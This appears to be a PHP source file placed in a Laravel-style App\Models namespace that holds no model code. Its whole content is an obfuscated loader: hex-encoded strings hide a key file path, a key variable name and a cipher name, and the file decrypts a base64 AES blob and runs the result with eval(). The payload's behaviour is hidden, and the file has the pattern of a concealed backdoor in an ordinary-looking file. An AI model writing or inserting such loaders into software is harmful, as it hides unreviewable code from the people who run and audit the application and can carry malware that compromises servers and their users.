<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('I11v044JLRf2C19tQiiQ8A==');

$c=base64_decode(

'ShyUeKu1/C8IbwICKK8M7c1GVVx7h7LWJKeyY3J5JOca1I/xbri9a2EJu0MioS/gQ7kma9WbiOaI' .
'ogiEjqwGvNQ46B8YSGjOEE0JIUPD3xtDSNXjp+ZiL0A34hAiYuuHuLdHfdZvkTicZIt2ik2zT8+e' .
'HAVw8WC16CWy1tOCEvTT2S4AeBI4NpS+xSaoJj17c30640Z/V/N1XvnSLLmd6PTbYcZxRBU885wH' .
'kBlmk/WNZoxah+P4mNNXmmFfnfxgoUtMYVWK6UEUyEFeAuqsOaYxIwrZitz5XRdGJYyw+KIHZ5E+' .
'yzSKXFQMYc/W1IOotjlXL0yKhjvuW/N8LaDCUY/O5fEUb6kYFaXDev96s86ORuGJno6HLY1PH413' .
'rfTI+a6v0L94D8wLlH/S4ozBYkPfXzOvdE1DCIr0PpoxUqiLqYbC5Z+AFfKg/sTGpAtTNFy2o3d7' .
'rsKUlBjiVujmlx5r2GCCItzosS/HKqv5MCwJg03nNIQr+LvrUm2ULdsLrxK9yK3Jnd5om20MkGXM' .
'82Arg6sWnNfx6TE2BAhvHdOJQgWR3Z0LsT6oHeD4VMqJdtj3acdiYzDqfuepXa8hraTwrYOdHagP' .
'Yjnp2Al2vCO1zmwajvdQ9pnE647VqNfROuMPWqpNEAd+HvHiFuTsjmIFyMwU/PHfqwtwwJgSpQT1' .
'uifTFQTKrzJos606LekQYWbk0Wt1LaPhEztqwbEiv1y7Y0XVih299YmQzM++tWDn3k/QSUGWIRwF' .
'G0hxktL50RGahDW1QXIEmjiOHw5Fo7HjQXMpbv3f8HaIiTZGVzPHYMtL8cA2Y4Qrowh4nIqZ67Za' .
'kw8V3Mgv5T6tPUnpf9QuJlIZgBa2rLHp9gMiOgjiqNmt+S0zxagQVfSnewT1yaNUj/mABQtXysu0' .
'nlGTuLOJ2K2P+fz0qOHtWlsNboHhzE5xtA2KvikSqQJR8xsZARjG51KOZimUhd+PTVbIRw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

